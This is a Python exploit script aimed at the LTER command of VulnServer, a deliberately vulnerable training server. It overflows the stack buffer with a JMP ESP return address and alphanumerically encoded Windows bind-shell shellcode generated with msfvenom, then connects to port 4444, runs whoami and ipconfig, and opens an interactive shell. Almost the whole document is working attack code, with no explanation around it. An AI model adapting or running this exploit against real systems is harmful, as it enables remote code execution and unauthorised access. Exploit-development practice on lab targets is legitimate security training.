#!/usr/bin/python
import socket
import os
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host= sys.argv[1]
port=9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)

A   = "\x41" * 2006

# 62501203   FFE4             JMP ESP
EIP = p32(0x62501203)

nops = "\x44" * 16

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed  EXITFUNC=thread BufferRegister=ESP -f c
shellcode =(
        "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
        "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
        "\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x6a\x48\x4f\x72\x63\x30"
        "\x55\x50\x33\x30\x31\x70\x6d\x59\x59\x75\x45\x61\x59\x50\x75"
        "\x34\x6e\x6b\x52\x70\x64\x70\x6e\x6b\x66\x32\x66\x6c\x4c\x4b"
        "\x66\x32\x45\x44\x4c\x4b\x54\x32\x51\x38\x66\x6f\x6d\x67\x63"
        "\x7a\x61\x36\x56\x51\x79\x6f\x4e\x4c\x67\x4c\x53\x51\x63\x4c"
        "\x53\x32\x56\x4c\x31\x30\x79\x51\x68\x4f\x34\x4d\x63\x31\x48"
        "\x47\x49\x72\x68\x72\x46\x32\x71\x47\x6c\x4b\x43\x62\x72\x30"
        "\x6c\x4b\x52\x6a\x65\x6c\x4c\x4b\x30\x4c\x62\x31\x72\x58\x4a"
        "\x43\x72\x68\x55\x51\x38\x51\x72\x71\x4c\x4b\x33\x69\x37\x50"
        "\x66\x61\x4a\x73\x4e\x6b\x71\x59\x55\x48\x6d\x33\x45\x6a\x63"
        "\x79\x4e\x6b\x44\x74\x6c\x4b\x73\x31\x79\x46\x50\x31\x39\x6f"
        "\x4e\x4c\x39\x51\x4a\x6f\x66\x6d\x37\x71\x69\x57\x76\x58\x79"
        "\x70\x50\x75\x69\x66\x54\x43\x31\x6d\x7a\x58\x35\x6b\x61\x6d"
        "\x51\x34\x32\x55\x5a\x44\x31\x48\x6c\x4b\x73\x68\x35\x74\x75"
        "\x51\x48\x53\x50\x66\x4e\x6b\x74\x4c\x30\x4b\x4c\x4b\x73\x68"
        "\x75\x4c\x56\x61\x4a\x73\x6e\x6b\x56\x64\x4e\x6b\x33\x31\x4e"
        "\x30\x6e\x69\x32\x64\x35\x74\x76\x44\x33\x6b\x43\x6b\x50\x61"
        "\x30\x59\x43\x6a\x66\x31\x69\x6f\x4d\x30\x73\x6f\x61\x4f\x73"
        "\x6a\x4c\x4b\x65\x42\x6a\x4b\x6c\x4d\x73\x6d\x65\x38\x34\x73"
        "\x30\x32\x73\x30\x77\x70\x53\x58\x53\x47\x72\x53\x64\x72\x73"
        "\x6f\x56\x34\x71\x78\x72\x6c\x30\x77\x34\x66\x77\x77\x39\x6f"
        "\x49\x45\x4c\x78\x6c\x50\x76\x61\x55\x50\x45\x50\x35\x79\x4b"
        "\x74\x46\x34\x32\x70\x72\x48\x66\x49\x4b\x30\x62\x4b\x53\x30"
        "\x69\x6f\x68\x55\x31\x7a\x66\x68\x50\x59\x66\x30\x78\x62\x4b"
        "\x4d\x37\x30\x36\x30\x71\x50\x70\x50\x65\x38\x38\x6a\x46\x6f"
        "\x4b\x6f\x4d\x30\x4b\x4f\x69\x45\x6e\x77\x35\x38\x55\x52\x53"
        "\x30\x56\x71\x33\x6c\x6c\x49\x48\x66\x32\x4a\x66\x70\x71\x46"
        "\x46\x37\x35\x38\x4a\x62\x59\x4b\x37\x47\x71\x77\x69\x6f\x4a"
        "\x75\x51\x47\x33\x58\x4e\x57\x59\x79\x74\x78\x59\x6f\x6b\x4f"
        "\x59\x45\x32\x77\x31\x78\x30\x74\x58\x6c\x77\x4b\x79\x71\x4b"
        "\x4f\x4e\x35\x31\x47\x6f\x67\x63\x58\x61\x65\x70\x6e\x50\x4d"
        "\x45\x31\x6b\x4f\x7a\x75\x33\x58\x63\x53\x30\x6d\x50\x64\x57"
        "\x70\x6f\x79\x49\x73\x31\x47\x50\x57\x63\x67\x44\x71\x4c\x36"
        "\x33\x5a\x76\x72\x61\x49\x33\x66\x6d\x32\x59\x6d\x63\x56\x4f"
        "\x37\x43\x74\x57\x54\x45\x6c\x57\x71\x53\x31\x4c\x4d\x50\x44"
        "\x55\x74\x52\x30\x4f\x36\x63\x30\x53\x74\x72\x74\x46\x30\x36"
        "\x36\x72\x76\x53\x66\x50\x46\x73\x66\x42\x6e\x73\x66\x52\x76"
        "\x70\x53\x36\x36\x43\x58\x52\x59\x5a\x6c\x65\x6f\x4d\x56\x49"
        "\x6f\x59\x45\x4c\x49\x4d\x30\x42\x6e\x33\x66\x50\x46\x6b\x4f"
        "\x50\x30\x50\x68\x47\x78\x6d\x57\x65\x4d\x31\x70\x59\x6f\x6b"
        "\x65\x4f\x4b\x69\x70\x77\x6d\x57\x5a\x46\x6a\x72\x48\x4c\x66"
        "\x7a\x35\x6d\x6d\x4f\x6d\x59\x6f\x4e\x35\x67\x4c\x53\x36\x63"
        "\x4c\x74\x4a\x4f\x70\x59\x6b\x79\x70\x64\x35\x46\x65\x4d\x6b"
        "\x77\x37\x72\x33\x71\x62\x32\x4f\x61\x7a\x33\x30\x61\x43\x6b"
        "\x4f\x6a\x75\x41\x41"
        )
C   = nops + shellcode + "\x43" * (3000 - len(A) - len(EIP) - len(nops) - len(shellcode))

buffer = "LTER ." + A + EIP + C

print "[+] Sending exploit buffer"
s.send(buffer)

print "[+] Waiting for shell."
time.sleep(2)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
